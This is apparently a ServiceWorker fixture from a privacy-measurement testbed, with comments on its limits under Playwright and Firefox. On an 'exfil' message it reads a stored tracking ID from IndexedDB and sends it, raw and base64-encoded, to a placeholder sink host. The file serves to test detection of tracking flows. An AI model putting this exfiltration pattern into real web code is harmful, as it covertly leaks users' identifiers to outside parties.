// PrivaDB ground-truth ServiceWorker (testbed/pages/wk-sw.js).
// On Playwright+Firefox the registration fetch bypasses context.route
// and blob:-URL registration is rejected (probe1 Q2 / probe2 Q11), so
// this context is ENVIRONMENT-DARK for the hook layer: its exfil flows
// are asserted browser-side via the sink (see evaluate.py coverage),
// NOT scored in WORKER_FLOWS. Kept so the limitation stays measured
// and visible in every report, not assumed.
const SINK = "__SINK_BASE__";

self.addEventListener("install", (e) => { self.skipWaiting(); });
self.addEventListener("activate", (e) => {
  e.waitUntil((async () => {
    try { await self.clients.claim(); } catch (err) {}
  })());
});

function readTid() {
  return new Promise((resolve) => {
    try {
      const req = indexedDB.open("wk_db", 1);
      req.onupgradeneeded = (e) => {
        const db = e.target.result;
        if (!db.objectStoreNames.contains("ids"))
          db.createObjectStore("ids");
      };
      req.onsuccess = (e) => {
        const db = e.target.result;
        try {
          const tx = db.transaction("ids", "readonly");
          const g = tx.objectStore("ids").get("tid");
          g.onsuccess = () => resolve(g.result);
          g.onerror = () => resolve(null);
        } catch (err) { resolve(null); }
      };
      req.onerror = () => resolve(null);
    } catch (e) { resolve(null); }
  });
}

self.addEventListener("message", (e) => {
  if (!e.data || e.data.cmd !== "exfil") return;
  const done = e.ports && e.ports[0];
  (async () => {
    const tid = await readTid();
    if (tid) {
      try { fetch(`${SINK}/v/svraw?x=${tid}`); } catch (err) {}
      try { fetch(`${SINK}/v/svb64?x=${btoa(tid)}`); } catch (err) {}
    }
    if (done) done.postMessage(tid ? "sv-done" : "sv-fail:notid");
  })();
});
